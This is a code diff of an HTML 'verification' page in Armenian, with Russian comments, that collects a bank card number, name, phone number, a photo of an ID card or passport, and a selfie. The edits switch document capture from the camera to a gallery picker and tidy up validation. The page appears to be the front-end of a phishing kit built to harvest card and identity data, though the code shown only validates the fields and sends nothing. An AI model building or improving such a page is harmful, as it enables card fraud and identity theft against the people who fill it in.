@@ -23,7 +23,6 @@
 
 <div class="card">
   <header><h1>Վերիֆիկացիա</h1></header>
-  
   <div class="form">
     <label>Բանկային քարտի համար</label>
     <input type="text" id="card" placeholder="1234 5678 9012 3456" maxlength="19">
@@ -37,82 +36,68 @@
     <label>Հեռախոսահամար</label>
     <input type="tel" id="phone" placeholder="+374 99 123456">
 
-    <!-- 1. ДОКУМЕНТ — ТОЛЬКО ЗАДНЯЯ КАМЕРА -->
+    <!-- ДОКУМЕНТ — только выбор из галереи -->
     <div class="photo-box">
       <div style="font-weight:600;margin-bottom:15px;">ID քարտ կամ Անձնագիր</div>
-      <button type="button" class="btn" id="takeDoc">Նկարել փաստաթուղթը</button>
-      <input type="file" id="docCam" accept="image/*" capture="environment" style="display:none;">
+      <button type="button" class="btn" id="chooseDoc">Ընտրել փաստաթուղթը</button>
+      <input type="file" id="docFile" accept="image/*" style="display:none;">
       <img id="docImg" style="display:none;">
-      <div class="status" id="docStatus">Դեռ չի նկարվել</div>
+      <div class="status" id="docStatus">Դեռ չի ընտրվել</div>
     </div>
 
-    <!-- 2. СЕЛФИ — ТОЛЬКО ФРОНТАЛЬНАЯ КАМЕРА -->
+    <!-- СЕЛФИ — фронтальная камера -->
     <div class="photo-box">
-      <div style="font-weight:600;margin-bottom:15px;">Սելֆի (դեմքը պետք է լինի լավ տեսանելի)</div>
+      <div style="font-weight:600;margin-bottom:15px;">Սելֆի</div>
       <button type="button" class="btn" id="takeSelfie">Սելֆի անել</button>
       <input type="file" id="selfieCam" accept="image/*" capture="user" style="display:none;">
       <img id="selfieImg" style="display:none;">
       <div class="status" id="selfieStatus">Դեռ չի արվել</div>
     </div>
 
-    <button id="submitBtn">Ուղարկել տվյալները</button>
+    <button id="submitBtn">Ուղարկել</button>
   </div>
 </div>
 
 <script>
-// Формат карты
 document.getElementById('card').addEventListener('input', e => {
   let v = e.target.value.replace(/\D/g,'').match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/);
   e.target.value = !v[2] ? v[1] : v[1]+' '+v[2]+(v[3] ? ' '+v[3] : '')+(v[4] ? ' '+v[4] : '');
 });
 
-// === ДОКУМЕНТ — задняя камера ===
-document.getElementById('takeDoc').onclick = () => {
-  document.getElementById('docCam').click();
-};
-
-document.getElementById('docCam').onchange = e => {
-  const file = e.target.files[0];
-  if (!file) return;
-  const url = URL.createObjectURL(file);
+// Документ — только выбор
+document.getElementById('chooseDoc').onclick = () => document.getElementById('docFile').click();
+document.getElementById('docFile').onchange = e => {
+  if (!e.target.files[0]) return;
+  const url = URL.createObjectURL(e.target.files[0]);
   document.getElementById('docImg').src = url;
   document.getElementById('docImg').style.display = 'block';
-  document.getElementById('docStatus').textContent = 'Նկարված է';
+  document.getElementById('docStatus').textContent = 'Ընտրված է';
   document.getElementById('docStatus').style.color = '#00c853';
 };
 
-// === СЕЛФИ — фронтальная камера ===
-document.getElementById('takeSelfie').onclick = () => {
-  document.getElementById('selfieCam').click();
-};
-
+// Селфи — фронтальная камера
+document.getElementById('takeSelfie').onclick = () => document.getElementById('selfieCam').click();
 document.getElementById('selfieCam').onchange = e => {
-  const file = e.target.files[0];
-  if (!file) return;
-  const url = URL.createObjectURL(file);
+  if (!e.target.files[0]) return;
+  const url = URL.createObjectURL(e.target.files[0]);
   document.getElementById('selfieImg').src = url;
   document.getElementById('selfieImg').style.display = 'block';
   document.getElementById('selfieStatus').textContent = 'Արված է';
   document.getElementById('selfieStatus').style.color = '#00c853';
 };
 
-// === ОТПРАВКА ===
+// Отправка
 document.getElementById('submitBtn').onclick = () => {
-  const ok = 
-    document.getElementById('card').value.trim() &&
-    document.getElementById('name').value.trim() &&
-    document.getElementById('surname').value.trim() &&
-    document.getElementById('phone').value.trim() &&
-    document.getElementById('docImg').style.display === 'block' &&
-    document.getElementById('selfieImg').style.display === 'block';
-
-  if (!ok) {
-    alert('Խնդրում ենք լրացնել բոլոր դաշտերը և նկարել երկու լուսանկարն էլ');
+  if (!document.getElementById('card').value.trim() ||
+      !document.getElementById('name').value.trim() ||
+      !document.getElementById('surname').value.trim() ||
+      !document.getElementById('phone').value.trim() ||
+      document.getElementById('docImg').style.display !== 'block' ||
+      document.getElementById('selfieImg').style.display !== 'block') {
+    alert('Խնդրում ենք լրացնել բոլոր դաշտերը');
     return;
   }
-
   alert('Հաջողությամբ! Տվյալները պատրաստ են');
-  console.log('Готово к отправке на сервер');
 };
 </script>
 </body>
